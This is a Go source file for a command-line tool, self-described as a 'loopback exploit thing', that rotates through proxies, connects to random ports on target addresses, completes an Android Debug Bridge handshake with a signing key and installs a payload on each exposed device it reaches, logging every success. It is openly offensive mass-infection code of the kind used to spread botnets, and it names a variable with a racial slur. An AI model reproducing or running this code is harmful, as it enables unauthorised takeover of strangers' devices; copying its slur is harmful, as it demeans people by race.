package main

import (
	"android/internal/adb"
	"fmt"
	"log"
	"math/rand"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

var CountryCodes = []string{
	"AF", "AX", "AL", "DZ", "AS", "AD", "AO", "AI", "AQ", "AG",
	"AR", "AM", "AW", "AU", "AT", "AZ", "BS", "BH", "BD", "BB",
	"BY", "BE", "BZ", "BJ", "BM", "BT", "BO", "BQ", "BA", "BW",
	"BV", "BR", "IO", "BN", "BG", "BF", "BI", "CV", "KH", "CM",
	"CA", "KY", "CF", "TD", "CL", "CN", "CX", "CC", "CO", "KM",
	"CG", "CD", "CK", "CR", "CI", "HR", "CU", "CW", "CY", "CZ",
	"DK", "DJ", "DM", "DO", "EC", "EG", "SV", "GQ", "ER", "EE",
	"SZ", "ET", "FK", "FO", "FJ", "FI", "FR", "GF", "PF", "TF",
	"GA", "GM", "GE", "DE", "GH", "GI", "GR", "GL", "GD", "GP",
	"GU", "GT", "GG", "GN", "GW", "GY", "HT", "HM", "VA", "HN",
	"HK", "HU", "IS", "IN", "ID", "IR", "IQ", "IE", "IM", "IL",
	"IT", "JM", "JP", "JE", "JO", "KZ", "KE", "KI", "KP", "KR",
	"KW", "KG", "LA", "LV", "LB", "LS", "LR", "LY", "LI", "LT",
	"LU", "MO", "MG", "MW", "MY", "MV", "ML", "MT", "MH", "MQ",
	"MR", "MU", "YT", "MX", "FM", "MD", "MC", "MN", "ME", "MS",
	"MA", "MZ", "MM", "NA", "NR", "NP", "NL", "NC", "NZ", "NI",
	"NE", "NG", "NU", "NF", "MK", "MP", "NO", "OM", "PK", "PW",
	"PS", "PA", "PG", "PY", "PE", "PH", "PN", "PL", "PT", "PR",
	"QA", "RE", "RO", "RU", "RW", "BL", "SH", "KN", "LC", "MF",
	"PM", "VC", "WS", "SM", "ST", "SA", "SN", "RS", "SC", "SL",
	"SG", "SX", "SK", "SI", "SB", "SO", "ZA", "GS", "SS", "ES",
	"LK", "SD", "SR", "SJ", "SE", "CH", "SY", "TW", "TJ", "TZ",
	"TH", "TL", "TG", "TK", "TO", "TT", "TN", "TR", "TM", "TC",
	"TV", "UG", "UA", "AE", "GB", "US", "UM", "UY", "UZ", "VU",
	"VE", "VN", "VG", "VI", "WF", "EH", "YE", "ZM", "ZW",
}

var proxyCmd = &cobra.Command{
	Use:   "ipv4",
	Short: "loopback exploit thing.",
	Run:   runProxy,
}

func init() {
	rootCmd.AddCommand(proxyCmd)
	proxyCmd.Flags().StringVarP(&proxyInputFile, "input", "i", "prx.txt", "Proxy file to use")
}

func runProxy(cmd *cobra.Command, args []string) {
	loadProxyFile()

	if err := loadSigner("auth.key"); err != nil {
		log.Println("Reading key failed, make sure there is a auth.key")
		return
	}

	for i := 0; i < globalThreads; i++ {
		go func() {
			for {
				doProxyScan(proxies.Next())
				time.Sleep(1 * time.Millisecond)
			}
		}()
	}

	select {}
}

func doProxyScan(prx string) {
	nigger := strings.ReplaceAll(prx, "<$r>", String(8))
	if len(nigger) < 1 {
		return
	}
	nigger = strings.ReplaceAll(nigger, "<$rc>", CountryCodes[rand.Intn(len(CountryCodes))])
	if len(nigger) < 1 {
		return
	}

	proxerSplit := strings.Split(nigger, "|")
	if len(proxerSplit) < 2 {
		return
	}

	addr := proxerSplit[1]
	proxyHost, auth := parseProxy(proxerSplit[0])
	//fmt.Println(auth)
	dialer, err := getDialer(proxyHost, auth)
	if err != nil {
		return
	}

	p := globalPorts[rand.Intn(len(globalPorts))]
	conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", addr, p))
	if err != nil {
		//fmt.Println(err)
		return
	}

	defer conn.Close()

	c := adb.NewClient(conn)
	c.SetSigner(rsaSigner)

	name, model, err := c.Handshake()
	if err != nil {
		//log.Println(err.Error())
		return
	}

	// handle this lol
	if err := handlePayload(c); err == nil {
		poolName := "unknown"
		if len(proxerSplit) > 2 {
			poolName = proxerSplit[2]
		}

		fmt.Printf("[success %s] installed payload on device '%s' (%s) p%d\n", poolName, name, model, p)
	}
}
